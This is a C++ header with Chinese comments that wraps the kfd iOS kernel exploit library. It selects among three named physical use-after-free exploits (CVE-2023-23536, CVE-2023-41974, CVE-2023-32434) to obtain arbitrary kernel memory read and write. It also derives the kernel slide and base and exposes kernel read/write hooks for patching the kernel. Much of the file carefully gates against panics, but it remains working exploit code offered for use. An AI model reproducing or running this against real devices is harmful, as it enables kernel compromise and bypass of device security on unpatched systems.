// KfdBackend.h —— kfd（kernel file descriptor）后端的薄封装
//
// 位置：src/Kernel/KfdBackend.h
// 作用：把 vendor 里开源 kfd 的 4 个公开 API（kopen / kread / kwrite / kclose）
//       包成 KernelBackend.h 里 kback::Ops 那种"先说清能不能用"的形态：
//       初始化失败只是返回 false + 打印原因，绝不把进程带走、绝不 abort。
//
// namespace 用的是 kfdb，和 KernelBackend.h 的 kback 不冲突，也不碰它的符号。
//
// ============================================================================
// 一、这个后端在什么前提下才可用（缺任何一条都返回 false，绝不"试试看"）
// ============================================================================
// 1) 架构必须是 arm64 / arm64e。
//    kfd 整个实现建立在 16K 页（static_info.h:18-19 ARM_PGSHIFT=14）与 PAC 语义
//    （static_info.h:96-100 PTR_MASK / PAC_MASK / UNSIGN_PTR）之上；非 arm64 直接不可用。
//
// 2) 当前内核版本必须命中 vendor 里的 kern_versions[] 表
//    （vendor/kfd_src/kfd-main/kfd/libkfd/info/dynamic_info.h:32-114）。
//    这张表是 kfd 唯一的"内核侧真值来源"：proc / task 结构体字段偏移 + kernelcache
//    静态符号地址都在里面。表里没有当前 kern.version 时，kopen() 会在
//    info_init() 里走到 assert_false("unsupported osversion")（info.h:103），
//    而那个 assert 宏的实现是 print + sleep(30) + exit(1)（common.h:117-126）。
//    ★ 所以本文件在调用 kopen() 之前**自己先查一遍表**：查不到就直接返回 false，
//      既不 panic 内核，也不让进程自杀式退出。
//
// 3) 进程要能打开 /dev/aes_0（O_RDWR）并对它做 PERFMON_CTL_SPECIFY ioctl。
//    perf_init() 用 open("/dev/aes_0", O_RDWR) 拿 fd，失败就 assert（perf.h:86-87）；
//    perf_kread/perf_kwrite 靠 ioctl(fd, PERFMON_CTL_SPECIFY, ...) 干活（perf.h:26、perf.h:59）。
//    注：这一版 vendored kfd 走的是"设备节点 + ioctl"，不是 IOKit user client，
//    所以真正的前提是"能打开这些设备节点"（无沙盒 + root 的 TrollStore 形态最稳），
//    而不是某个 IOKit 用户客户端权限。
//
// 4) 文件描述符上限要够大。kread/kwrite 选 sem_open 这条路时，
//    kread_sem_open_init() 用 kern.maxfilesperproc - 100 当作 spray 上限并 setrlimit
//    （kread_sem_open.h:16-17、info.h:81-86）。上限太小 → 找不到对象 → 内部 assert。
//
// 5) 想拿 kernel base 就必须有 kernelcache 符号表。见下面第二节和 read_kernel_base()。
//
// ============================================================================
// 二、为什么没拿到符号表时不许硬编码偏移
// ============================================================================
// proc / task / fileproc / vnode 的字段偏移，以及 kernelcache 里的静态符号地址
// （vn_kqfilter、ptov_table、gVirtBase、gPhysBase、cdevsw…），
// 由**具体的 XNU 构建**决定，不是由 iOS 版本号决定。
// 同一个 build（例如 20B101）在不同设备上可以复用；16.1 与 16.1.1 是两个 build，
// 偏移就不一样（Docs/BuildTable.h 的注释写的是同一件事）。
//
// 硬编码一个"看起来差不多"的数值，代价分两档：
//   · 算错读地址 → kread 读到垃圾 → 我们据此推出错误的补丁点；
//   · 算错写地址 → kwrite 落到不该落的内核内存 → 立即 panic。
// Docs/KFD-RISK-SPLIT.md 里那条"查不到就立刻停止，绝不猜"，说的就是这件事。
//
// 正确路径是：用 KernelCache.h 那条**只读**流程在设备上解析本机 kernelcache，
// 把 proc/task 偏移和 kernelcache 符号地址量出来，再填进
// dynamic_info.h 的 kern_versions[]；填完之后 kfd 自己就能算 kernel slide，
// 本文件也就能通过 read_kernel_base() 把 base 交出去。任何"先写死一个值跑跑看"
// 的做法都是拿用户的设备当赌注，本文件不提供这个口子。
//
// ============================================================================
// 三、include 策略（二选一里选"直接 include 真头文件"）与它的代价
// ============================================================================
// 选 include 真头文件，不自己 extern "C" 重声明，理由：
//   a) puaf_method / kread_method / kwrite_method 三个枚举只在 libkfd.h:21-35 有名字。
//      自己重声明就必须抄数值，而这三个枚举的顺序很反直觉：
//      libkfd.h 里是 physpuppet=0、smith=1、landa=2（不是按字母、也不是按我们的约定）。
//      抄错 = 静默用错漏洞 = 白跑一次可能 panic 的利用，所以宁可 include。
//   b) 我们还要用 kern_versions[]（版本门禁）、ARM64_LINK_ADDR（kernel base 的链接基址）、
//      struct kfd 的 info/perf 字段（current_proc / kernel_proc / kernel_slide）。
//      这些都在 libkfd.h 及其 include 链里，重声明等于把定义再抄一遍，必然漂移。
// 代价（必须知道）：
//   libkfd.h 不是纯声明头 —— kopen / kread / kwrite / kclose 以及 info_init、puaf_init、
//   krkw_init、perf_init… 全都是**定义**（libkfd.h:148-203 等）。
//   => **本头文件必须且只能被一个翻译单元 include**，否则链接期会出现一堆
//      duplicate symbol（kopen/kread/kwrite/kclose…）。
//      建议：让唯一那个后端实现文件（例如 daemon 下的一个 .mm）include 它，
//      其它文件只通过我们下面导出的 ops_* 函数指针使用。
//
// 另一个必须知道的副作用：libkfd/common.h:117 把 assert() 重定义成
//   "打印 + sleep(30) + exit(1)" 的宏（覆盖 <assert.h> 的标准语义）。
//   因此本文件里任何前提检查都不写成 assert()——写了就等于把"返回 false"
//   换成"进程死掉"。这也是 KernelBackend.h 里"宁可不可用，也不猜"的具体落实。
//
// ============================================================================
// 四、用法
// ============================================================================
//   kfdb::Client c;
//   if (!c.init(1)) {                 // 1 = landa；0 = physpuppet；2 = smith
//       // 具体原因已经在日志里（[kfdb] 前缀），调用方直接停手即可
//   }
//   uint64_t base = 0;
//   if (c.read_kernel_base(&base)) { /* 有 base 才能谈偏移 */ }
//   uint8_t buf[16] = {0};
//   c.kread_buf(base, buf, sizeof(buf));
//   c.shutdown();
//
// 不留待办占位、不写伪代码；拿不到的东西一律返回 false 并打印原因。

#pragma once

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>

// 路径从 src/Kernel/ 出发解析：../../ = 仓库根，然后进 vendor。
// 先做一次可诊断的检查，让"路径写错"变成一条看得懂的编译错误，
// 而不是后面一连串 "unknown type name 'u64'"。
#if defined(__has_include)
#  if !__has_include("../../vendor/kfd_src/kfd-main/kfd/libkfd.h")
#    error "KfdBackend.h: 找不到 ../../vendor/kfd_src/kfd-main/kfd/libkfd.h —— 本文件必须位于 arena-ios/src/Kernel/ 下，且 vendor/kfd_src/kfd-main/kfd/ 存在"
#  endif
#endif

#include "../../vendor/kfd_src/kfd-main/kfd/libkfd.h"

namespace kfdb {

// ---------------------------------------------------------------------------
// 常量：全部来自源码，不自己编
// ---------------------------------------------------------------------------

// kopen() 对 puaf_pages 的硬边界，见 libkfd.h:171-177 的 assert(puaf_pages >= 16 / <= 2048)。
// 越界时 kopen 内部那个 assert 会 sleep(30)+exit(1)，所以我们必须先挡掉。
inline constexpr uint64_t kPuafPagesMin = 16;
inline constexpr uint64_t kPuafPagesMax = 2048;

// 默认页数。kfd 自己的两个调用示例都用 2048 这一档：
//   macos_kfd.c:11  -> kopen(2048, puaf_landa, kread_sem_open, kwrite_sem_open)
//   ContentView.swift 的 puaf_pages_options 末项 = 2048（puaf_pages_index 默认也是它）
inline constexpr uint64_t kDefaultPuafPages = 2048;

// kernel base 处的 Mach-O 64 头校验期望值（与 perf.h:112-117 的校验逐字一致）：
//   magic   = 0xfeedfacf
//   cputype = 0x0100000c (CPU_TYPE_ARM64)
inline constexpr uint32_t kMachOMagic64 = 0xfeedfacfu;
inline constexpr uint32_t kCpuTypeArm64 = 0x0100000cu;

// ---------------------------------------------------------------------------
// 小工具：读 sysctl（只需要 <stdio.h>/<string.h> 之外的系统声明，
// 它们来自 libkfd.h -> libkfd/common.h:19 的 <sys/sysctl.h> 和 common.h:20 的 <unistd.h>，
// 所以本文件不用再额外 include 什么）
// ---------------------------------------------------------------------------

inline bool sysctl_str(const char* name, char* out, size_t cap) {
    if (!name || !out || cap < 2) return false;
    out[0] = 0;
    size_t len = cap - 1;
    if (sysctlbyname(name, out, &len, nullptr, 0) != 0) {
        out[0] = 0;
        return false;
    }
    out[cap - 1] = 0;
    return true;
}

// 同一个函数要能吃 int 型（kern.maxfilesperproc 是 int）和 quad 型：
// 给 8 字节缓冲，读回长度 4 或 8 都接受，内核不会写溢出。
inline bool sysctl_u64(const char* name, uint64_t* out) {
    if (!name || !out) return false;
    *out = 0;
    uint64_t v = 0;
    size_t len = sizeof(v);
    if (sysctlbyname(name, &v, &len, nullptr, 0) != 0) return false;
    if (len != sizeof(uint32_t) && len != sizeof(uint64_t)) return false;
    *out = (uint64_t)v;
    return true;
}

// ---------------------------------------------------------------------------
// 版本表门禁
// ---------------------------------------------------------------------------

inline size_t table_count(void) {
    return sizeof(kern_versions) / sizeof(kern_versions[0]);
}

// 与 info.h:93-101 完全同一种比较方式：拿 kern.version 去和表里每条的前缀比。
// 这样"我们判断能用"和"kfd 自己判断能用"不会出现分歧。
// 说明：调用方传进来的缓冲区必须是清零的长缓冲（本文件用 char[512]），
// 所以表里的串比实际串长时，memcmp 只会读到 0，不会越界。
inline int find_vid(const char* kern_version) {
    if (!kern_version || !kern_version[0]) return -1;
    const size_t n = table_count();
    for (size_t i = 0; i < n; i++) {
        const char* want = kern_versions[i].kern_version;
        if (!want || !want[0]) continue;
        if (strcmp(want, "todo") == 0) continue;   // 表里的 macOS 占位条目，不能当命中
        if (memcmp(kern_version, want, strlen(want)) == 0) return (int)i;
    }
    return -1;
}

// 用户侧 method 编号 -> kfd 的 puaf_method 枚举值。
//
// ★ 这里的顺序和源码不一样，必须按名字映射：
//     libkfd.h:21-25  enum puaf_method { puaf_physpuppet, puaf_smith, puaf_landa };
//     也就是源码里 puaf_physpuppet=0、puaf_smith=1、puaf_landa=2；
//   而我们对外约定的编号是 0=physpuppet、1=landa、2=smith。
//   把用户给的数字直接丢给 kopen()，选 1 会拿到 smith、选 2 会拿到 landa。
inline bool map_puaf_method(int method, uint64_t* out_method, const char** out_name) {
    if (!out_method || !out_name) return false;
    switch (method) {
        case 0:
            *out_method = (uint64_t)puaf_physpuppet;
            *out_name = "physpuppet(CVE-2023-23536, 在 iOS 16.4 修掉)";
            return true;
        case 1:
            *out_method = (uint64_t)puaf_landa;
            *out_name = "landa(CVE-2023-41974, 在 iOS 17.0 修掉)";
            return true;
        case 2:
            *out_method = (uint64_t)puaf_smith;
            *out_name = "smith(CVE-2023-32434, 在 iOS 16.5.1 修掉)";
            return true;
        default:
            return false;
    }
}

// ---------------------------------------------------------------------------
// Client
// ---------------------------------------------------------------------------

struct Client {
    uint64_t handle;   // kopen() 返回的不透明句柄；0 = 不可用
    int      method;   // 0=physpuppet 1=landa 2=smith；-1 = 未初始化
    bool     ok;       // 只有 kopen() 成功且关键字段都拿到才是 true

    Client() : handle(0), method(-1), ok(false) {}

    // method: 0=physpuppet 1=landa 2=smith。失败返回 false 并打印原因，绝不 abort/assert。
    bool init(int method, uint64_t puaf_pages = kDefaultPuafPages);

    // 内核读：size 必须是 8 的倍数（kread 内部按 u64 步进，非 8 倍数会静默丢尾部）。
    bool kread_buf(uint64_t kaddr, void* uaddr, uint64_t size) const;

    // 内核写："写前备份、写后回读"由上层负责（KernelBackend.h 的 write_verified 就干这个），
    // 这里只负责把数据送进内核。size 同样必须是 8 的倍数。
    bool kwrite_buf(void* uaddr, uint64_t kaddr, uint64_t size) const;

    // 取内核基址。拿不到返回 false，并说明差的是哪一样（通常是"需要 kernelcache 符号"）。
    bool read_kernel_base(uint64_t* out_base) const;

    void shutdown();

    // 下面三个是 kfd 已经解析好的字段，纯读，零风险；
    // 上层做 proc 遍历 / 自检时会用到（KfdBackend 不自己猜偏移）。
    uint64_t kernel_proc(void) const;
    uint64_t current_proc(void) const;
    uint64_t kernel_slide(void) const;
};

// ---------------------------------------------------------------------------
// Client::init
// ---------------------------------------------------------------------------

inline bool Client::init(int method_in, uint64_t puaf_pages) {
    // kfd 的失败分支会 sleep(30) 再 exit；块缓冲会把前面的日志全丢掉，先关掉缓冲。
    setvbuf(stdout, nullptr, _IONBF, 0);

    printf("[kfdb] ==== kfd 后端初始化开始 ====\n");

    if (handle != 0) {
        printf("[kfdb] 已有句柄 0x%llx，不重复 kopen（同一进程内二次 PUAF 会互相踩）\n",
               (unsigned long long)handle);
        return ok;
    }
    ok = false;
    method = -1;

    // ---- 0. 环境信息：只读，零风险，出问题时这几行是唯一线索 ----
    char kern_version[512] = {0};
    char os_version[64] = {0};
    char machine[64] = {0};
    uint64_t maxfiles = 0;
    const bool have_kv = sysctl_str("kern.version", kern_version, sizeof(kern_version));
    const bool have_os = sysctl_str("kern.osversion", os_version, sizeof(os_version));
    const bool have_hw = sysctl_str("hw.machine", machine, sizeof(machine));
    const bool have_mf = sysctl_u64("kern.maxfilesperproc", &maxfiles);

    printf("[kfdb] pid            = %d\n", (int)getpid());
    printf("[kfdb] hw.machine     = %s\n", have_hw ? machine : "(读不到)");
    printf("[kfdb] kern.osversion = %s\n", have_os ? os_version : "(读不到)");
    printf("[kfdb] kern.version   = %s\n", have_kv ? kern_version : "(读不到)");
    if (have_mf) {
        printf("[kfdb] maxfilesperproc= %llu\n", (unsigned long long)maxfiles);
        if (maxfiles < 1024) {
            printf("[kfdb] 警告：文件描述符上限偏低，sem_open 那条 kread/kwrite 路径的 spray 空间会很窄，\n");
            printf("[kfdb]       失败概率上升。有条件就先 sysctl kern.maxfilesperproc 抬高（TrollStore 形态下可写）。\n");
        }
    } else {
        printf("[kfdb] maxfilesperproc= (读不到)\n");
    }

    // ---- 1. 架构门禁 ----
    // __arm64e__ 是编译器在 target 为 arm64e 时定义的宏；TrollStore 装的 app 在
    // A12 及以上设备上按 arm64e 编译，与 arm64 的关键差别是函数/数据指针带 PAC。
    bool arch_arm64 = false;
    bool arch_arm64e = false;
#if defined(__arm64e__)
    arch_arm64 = true;
    arch_arm64e = true;
#elif defined(__arm64__) || defined(__aarch64__)
    arch_arm64 = true;
#else
    arch_arm64 = false;
#endif

    if (!arch_arm64) {
        printf("[kfdb] 架构不是 arm64/arm64e：kfd 的页表与 PAC 语义都建立在 arm64 上 → 返回 false\n");
        return false;
    }
    if (arch_arm64e) {
        printf("[kfdb] 编译目标  = arm64e（PAC 生效，UNSIGN_PTR 走 SIGN/PAC_MASK 那条分支）\n");
    } else {
        printf("[kfdb] 编译目标  = arm64（无 PAC）。UNSIGN_PTR 的位处理会与实际不符，\n");
        printf("[kfdb]       读出来的内核指针可能带不可用高位 —— 继续执行但请把每一条 kread 结果都当可疑数据校验。\n");
    }

    // ---- 2. 内核版本门禁（关键：不通过就绝不调 kopen）----
    if (!have_kv) {
        printf("[kfdb] 读不到 kern.version → 无法查表 → 不调用 kopen（盲调会让进程 sleep(30) 后 exit）\n");
        return false;
    }
    const int vid = find_vid(kern_version);
    if (vid < 0) {
        printf("[kfdb] 当前内核版本不在 vendor 的 kern_versions[] 表内 → 不调用 kopen\n");
        printf("[kfdb]   原因：info_init() 查不到版本会执行 assert_false(\"unsupported osversion\")(info.h:103)，\n");
        printf("[kfdb]        而 common.h:117 的 assert 宏是 print + sleep(30) + exit(1)，\n");
        printf("[kfdb]        即进程会被带走。这里先停，把控制权还给调用方。\n");
        printf("[kfdb]   表里现有的 %zu 条（memcmp 前缀匹配）：\n", table_count());
        for (size_t i = 0; i < table_count(); i++) {
            const char* s = kern_versions[i].kern_version;
            printf("[kfdb]     [%zu] %s\n", i, (s && s[0]) ? s : "(空)");
        }
        printf("[kfdb]   要支持这台设备：用 KernelCache.h 的只读流程解析本机 kernelcache，\n");
        printf("[kfdb]   量出 proc/task 偏移与 kernelcache 符号地址，往\n");
        printf("[kfdb]   vendor/.../libkfd/info/dynamic_info.h 的 kern_versions[] 里加一条，\n");
        printf("[kfdb]   kern_version 字面量必须与上面打印的那串完全一致（前缀匹配）。\n");
        return false;
    }

    const struct dynamic_info& di = kern_versions[vid];
    printf("[kfdb] 版本表命中：[%d] %s\n", vid, di.kern_version);
    printf("[kfdb]   perf_supported=%s  kread_kqueue_workloop_ctl_supported=%s\n",
           di.perf_supported ? "true" : "false",
           di.kread_kqueue_workloop_ctl_supported ? "true" : "false");

    // ---- 3. 表条目完整性门禁 ----
    // 这些字段是 kread/kwrite 建链时真正会读的量（缺一个就会在内核里读到错误偏移）：
    //   proc__object_size      —— find_proc 里 kernel_proc = task - proc__object_size (kread_sem_open.h:101)
    //   proc__p_pid            —— 遍历 proc 链认自己 (kread_sem_open.h:108)
    //   proc__p_list__le_prev  —— 沿 proc 链往前找 (kread_sem_open.h:114)
    //   task__map              —— info_run 里 current_map/kernel_map (info.h:121/143)
    struct FieldReq {
        const char* name;
        uint64_t    value;
    };
    const FieldReq required[] = {
        { "proc__object_size",     di.proc__object_size },
        { "proc__p_pid",           di.proc__p_pid },
        { "proc__p_list__le_prev", di.proc__p_list__le_prev },
        { "task__map",             di.task__map },
    };
    bool fields_ok = true;
    for (size_t i = 0; i < sizeof(required) / sizeof(required[0]); i++) {
        if (required[i].value == 0) {
            printf("[kfdb] 表条目缺字段 %s = 0 → 不调用 kopen（用 0 偏移去读会读到垃圾，甚至改错地方）\n",
                   required[i].name);
            fields_ok = false;
        }
    }
    if (!fields_ok) return false;

    // perf 打开时，kopen 内部会在 perf_run 里用这些值算 kernel slide 并 assert 校验：
    //   proc__p_fd__fd_ofiles (perf.h:97)、kernelcache__vn_kqfilter (perf.h:107)、
    //   kernelcache__cdevsw / perfmon_dev_open / ptov_table / gVirtBase / gPhysBase / gPhysSize。
    // 任何一个为 0，perf_run 都会算出错误的 slide 然后 assert（sleep(30)+exit），
    // 所以必须在调用前全部挡掉。
    if (di.perf_supported) {
        const FieldReq perf_fields[] = {
            { "proc__p_fd__fd_ofiles",           di.proc__p_fd__fd_ofiles },
            { "kernelcache__vn_kqfilter",        di.kernelcache__vn_kqfilter },
            { "kernelcache__cdevsw",             di.kernelcache__cdevsw },
            { "kernelcache__perfmon_dev_open",   di.kernelcache__perfmon_dev_open },
            { "kernelcache__perfmon_devices",    di.kernelcache__perfmon_devices },
            { "kernelcache__ptov_table",         di.kernelcache__ptov_table },
            { "kernelcache__gVirtBase",          di.kernelcache__gVirtBase },
            { "kernelcache__gPhysBase",          di.kernelcache__gPhysBase },
            { "kernelcache__gPhysSize",          di.kernelcache__gPhysSize },
        };
        bool perf_ok = true;
        for (size_t i = 0; i < sizeof(perf_fields) / sizeof(perf_fields[0]); i++) {
            if (perf_fields[i].value == 0) {
                printf("[kfdb] perf_supported=true 但 %s = 0 → 不调用 kopen（否则 perf_run 会算出错 slide 再 assert）\n",
                       perf_fields[i].name);
                perf_ok = false;
            }
        }
        if (!perf_ok) return false;
    } else {
        printf("[kfdb] 注意：perf_supported=false，这次拿不到 kernel slide，read_kernel_base() 会返回 false\n");
    }

    // ---- 4. puaf_pages 范围门禁（对齐 libkfd.h:171-177 的 assert）----
    if (puaf_pages < kPuafPagesMin || puaf_pages > kPuafPagesMax) {
        printf("[kfdb] puaf_pages=%llu 超出 kfd 允许区间 [%llu, %llu] → 不调用 kopen\n",
               (unsigned long long)puaf_pages,
               (unsigned long long)kPuafPagesMin,
               (unsigned long long)kPuafPagesMax);
        return false;
    }

    // ---- 5. puaf 方法映射 ----
    uint64_t puaf = 0;
    const char* puaf_name = nullptr;
    if (!map_puaf_method(method_in, &puaf, &puaf_name)) {
        printf("[kfdb] method=%d 非法：只接受 0=physpuppet 1=landa 2=smith → 不调用 kopen\n", method_in);
        return false;
    }

    // ---- 6. kread/kwrite 方法组合 ----
    // 源码里有两条硬约束，不能自己发明组合：
    //   krkw.h:73-75 —— 该内核不支持 kqueue_workloop_ctl 时 assert 禁止选它；
    //   krkw.h:77-79 —— kread 选 sem_open 时，kwrite 必须也是 sem_open。
    // 表里唯二的 iOS 条目 kread_kqueue_workloop_ctl_supported 都是 false，
    // 所以这一版固定用 sem_open 一对（macos_kfd.c:11 的官方示例也是这一对）。
    const uint64_t kread_m = (uint64_t)kread_sem_open;
    const uint64_t kwrite_m = (uint64_t)kwrite_sem_open;
    printf("[kfdb] puaf 方法   = %d -> %s (枚举值 %llu)\n",
           method_in, puaf_name, (unsigned long long)puaf);
    printf("[kfdb] kread 方法  = sem_open (枚举值 %llu)\n", (unsigned long long)kread_m);
    printf("[kfdb] kwrite 方法 = sem_open (枚举值 %llu)\n", (unsigned long long)kwrite_m);
    printf("[kfdb] puaf_pages  = %llu\n", (unsigned long long)puaf_pages);

    // ---- 7. 调用 kopen ----
    printf("[kfdb] 调用 kopen(puaf_pages=%llu, puaf_method=%llu, kread_method=%llu, kwrite_method=%llu)\n",
           (unsigned long long)puaf_pages,
           (unsigned long long)puaf,
           (unsigned long long)kread_m,
           (unsigned long long)kwrite_m);
    printf("[kfdb] 提醒：kopen 内部若走到它的 assert，会先在它自己那边 sleep(30) 再 exit(1)，\n");
    printf("[kfdb]       这一段发生在 kfd 内部，本文件拦不住；上面的门禁就是为了尽量不走到那里。\n");

    const u64 h = kopen((u64)puaf_pages, (u64)puaf, (u64)kread_m, (u64)kwrite_m);
    if (h == 0) {
        printf("[kfdb] kopen 返回 0 → 失败。已经退回调用方（进程还活着说明走的是返回路径，不是 assert）\n");
        return false;
    }

    handle = (uint64_t)h;
    method = method_in;
    ok = true;

    // ---- 8. 成功后把 kfd 自己解析出来的关键地址打印一遍（这些值后面就是偏移基准）----
    const struct kfd* k = (const struct kfd*)handle;
    printf("[kfdb] kopen 成功，handle=0x%llx\n", (unsigned long long)handle);
    printf("[kfdb]   env: pid=%d vid=%llu maxfilesperproc=%llu\n",
           (int)k->info.env.pid,
           (unsigned long long)k->info.env.vid,
           (unsigned long long)k->info.env.maxfilesperproc);
    printf("[kfdb]   current_proc=0x%llx current_task=0x%llx\n",
           (unsigned long long)k->info.kaddr.current_proc,
           (unsigned long long)k->info.kaddr.current_task);
    printf("[kfdb]   kernel_proc =0x%llx kernel_task =0x%llx\n",
           (unsigned long long)k->info.kaddr.kernel_proc,
           (unsigned long long)k->info.kaddr.kernel_task);
    printf("[kfdb]   kernel_slide=0x%llx（0 表示 perf 没启用或没跑到）\n",
           (unsigned long long)k->perf.kernel_slide);
    printf("[kfdb] ==== 初始化成功 ====\n");
    return true;
}

// ---------------------------------------------------------------------------
// Client::kread_buf
// ---------------------------------------------------------------------------

inline bool Client::kread_buf(uint64_t kaddr, void* uaddr, uint64_t size) const {
    if (handle == 0 || !ok) {
        printf("[kfdb] kread 失败：后端未初始化（init 没成功过）\n");
        return false;
    }
    if (kaddr == 0) {
        printf("[kfdb] kread 失败：kaddr=0\n");
        return false;
    }
    if (!uaddr) {
        printf("[kfdb] kread 失败：uaddr=NULL\n");
        return false;
    }
    if (size == 0) {
        printf("[kfdb] kread 失败：size=0\n");
        return false;
    }
    if ((size % 8) != 0) {
        printf("[kfdb] kread 失败：size=%llu 不是 8 的倍数。kread 内部按 u64 步进（krkw.h:8-16），\n",
               (unsigned long long)size);
        printf("[kfdb]       余数字节会被静默丢掉 → 只读 8 的倍数，要 4 字节就按 8 字节读回来再截断。\n");
        return false;
    }

    // 成功路径不打印（一次遍历动辄上千次），第一次成功打一行，证明链路是通的。
    static bool logged_once = false;
    if (!logged_once) {
        printf("[kfdb] 首次 kread 成功：kaddr=0x%llx size=%llu（之后同类调用不再逐条打印）\n",
               (unsigned long long)kaddr, (unsigned long long)size);
        logged_once = true;
    }
    ::kread(handle, kaddr, uaddr, size);
    return true;
}

// ---------------------------------------------------------------------------
// Client::kwrite_buf
// ---------------------------------------------------------------------------

inline bool Client::kwrite_buf(void* uaddr, uint64_t kaddr, uint64_t size) const {
    if (handle == 0 || !ok) {
        printf("[kfdb] kwrite 失败：后端未初始化（init 没成功过）\n");
        return false;
    }
    if (kaddr == 0) {
        printf("[kfdb] kwrite 失败：kaddr=0\n");
        return false;
    }
    if (!uaddr) {
        printf("[kfdb] kwrite 失败：uaddr=NULL\n");
        return false;
    }
    if (size == 0) {
        printf("[kfdb] kwrite 失败：size=0\n");
        return false;
    }
    if ((size % 8) != 0) {
        printf("[kfdb] kwrite 失败：size=%llu 不是 8 的倍数\n", (unsigned long long)size);
        return false;
    }

    static bool logged_once = false;
    if (!logged_once) {
        printf("[kfdb] 首次 kwrite：kaddr=0x%llx size=%llu。注意：备份/回读校验由上层负责\n",
               (unsigned long long)kaddr, (unsigned long long)size);
        logged_once = true;
    }
    ::kwrite(handle, uaddr, kaddr, size);
    return true;
}

// ---------------------------------------------------------------------------
// Client::read_kernel_base
// ---------------------------------------------------------------------------

inline bool Client::read_kernel_base(uint64_t* out_base) const {
    if (out_base) *out_base = 0;
    if (!out_base) {
        printf("[kfdb] read_kernel_base 失败：出参为 NULL\n");
        return false;
    }
    if (handle == 0 || !ok) {
        printf("[kfdb] read_kernel_base 失败：后端未初始化\n");
        return false;
    }

    const struct kfd* k = (const struct kfd*)handle;
    const uint64_t vid = (uint64_t)k->info.env.vid;
    if (vid >= (uint64_t)table_count()) {
        printf("[kfdb] read_kernel_base 失败：env.vid=%llu 越界（表只有 %zu 条）\n",
               (unsigned long long)vid, table_count());
        return false;
    }
    const struct dynamic_info& di = kern_versions[vid];

    // 1) perf 没启用 → kfd 自己就没算 slide
    if (!di.perf_supported) {
        printf("[kfdb] 拿不到 kernel base：该内核版本 perf_supported=false，kfd 没算 kernel slide。\n");
        printf("[kfdb]   需要 kernelcache 符号：kernelcache__vn_kqfilter 等地址得先量出来填进表里。\n");
        return false;
    }
    // 2) 符号表缺项 → 连"该拿什么去减"都不知道
    if (di.kernelcache__vn_kqfilter == 0) {
        printf("[kfdb] 拿不到 kernel base：kernelcache__vn_kqfilter = 0。\n");
        printf("[kfdb]   需要 kernelcache 符号表：slide = vn_kqfilter - kernelcache__vn_kqfilter（perf.h:107）。\n");
        return false;
    }
    // 3) perf_run 没跑到 → slide 还是 0
    if (k->perf.kernel_slide == 0) {
        printf("[kfdb] 拿不到 kernel base：perf.kernel_slide=0（perf_init/perf_run 没走到，\n");
        printf("[kfdb]   常见原因是 /dev/aes_0 打不开或 perfmon ioctl 被拦）\n");
        return false;
    }

    // 4) kernel base = 链接基址 + slide（perf.h:108 用的就是这一行）
    const uint64_t base = (uint64_t)ARM64_LINK_ADDR + (uint64_t)k->perf.kernel_slide;

    // 5) 校验：base 处必须是 Mach-O 64 头（perf.h:112-117 的同一套校验）。
    //    校验不过就不把地址交出去 —— 宁可返回 false，也不让上层拿一个错地址去算偏移。
    uint32_t hdr[2] = {0, 0};
    if (!kread_buf(base, hdr, (uint64_t)sizeof(hdr))) {
        printf("[kfdb] read_kernel_base 失败：读 base=0x%llx 的 Mach-O 头没成功\n",
               (unsigned long long)base);
        return false;
    }
    if (hdr[0] != kMachOMagic64 || hdr[1] != kCpuTypeArm64) {
        printf("[kfdb] kernel base 校验失败：base=0x%llx 处 magic=0x%08x cputype=0x%08x"
               "（期望 0x%08x / 0x%08x）→ 不返回这个地址\n",
               (unsigned long long)base,
               (unsigned)hdr[0], (unsigned)hdr[1],
               (unsigned)kMachOMagic64, (unsigned)kCpuTypeArm64);
        return false;
    }

    *out_base = base;
    printf("[kfdb] kernel base = 0x%llx（slide=0x%llx，Mach-O 头校验通过）\n",
           (unsigned long long)base, (unsigned long long)k->perf.kernel_slide);
    return true;
}

// ---------------------------------------------------------------------------
// Client::shutdown
// ---------------------------------------------------------------------------

inline void Client::shutdown() {
    if (handle == 0) {
        printf("[kfdb] shutdown：当前没有句柄，什么都不做\n");
        ok = false;
        method = -1;
        return;
    }
    printf("[kfdb] shutdown：调用 kclose(0x%llx)\n", (unsigned long long)handle);
    ::kclose(handle);
    printf("[kfdb] shutdown：完成（kfd 内部的 PUAF/KRKW 对象与映射已释放）\n");
    handle = 0;
    method = -1;
    ok = false;
}

// ---------------------------------------------------------------------------
// 纯读取值：kfd 已经把 current_proc / kernel_proc 解析好了，直接用
// （find_proc 在 kread_sem_open.h:95-116，info_run 在 info.h:106-156）
// ---------------------------------------------------------------------------

inline uint64_t Client::kernel_proc(void) const {
    if (handle == 0) return 0;
    return ((const struct kfd*)handle)->info.kaddr.kernel_proc;
}

inline uint64_t Client::current_proc(void) const {
    if (handle == 0) return 0;
    return ((const struct kfd*)handle)->info.kaddr.current_proc;
}

inline uint64_t Client::kernel_slide(void) const {
    if (handle == 0) return 0;
    return ((const struct kfd*)handle)->perf.kernel_slide;
}

// ---------------------------------------------------------------------------
// 接进 kback::Ops 用的适配层
//
// KernelBackend.h:21-39 的 Ops 里全是"无上下文参数的函数指针"
// （bool (*)(uint64_t, void*, size_t) 这种），没法带 this，
// 所以只能用单例。这里不 include KernelBackend.h —— 本文件的 include 清单是被限定的，
// 由调用方在自己那边 set_backend 时把下面这几个地址填进 kback::Ops 即可。
// ---------------------------------------------------------------------------

inline Client& shared() {
    static Client c;
    return c;
}

// 默认用 landa（kfd 自己的 iOS 示例 ContentView.swift 的默认选择就是 landa 那一档）。
inline bool ops_init(void) {
    return shared().init(1);
}

inline bool ops_kread(uint64_t addr, void* out, size_t len) {
    return shared().kread_buf(addr, out, (uint64_t)len);
}

inline bool ops_kwrite(uint64_t addr, const void* in, size_t len) {
    return shared().kwrite_buf(const_cast<void*>(in), addr, (uint64_t)len);
}

inline uint64_t ops_kbase(void) {
    uint64_t base = 0;
    if (!shared().read_kernel_base(&base)) return 0;
    return base;
}

} // namespace kfdb
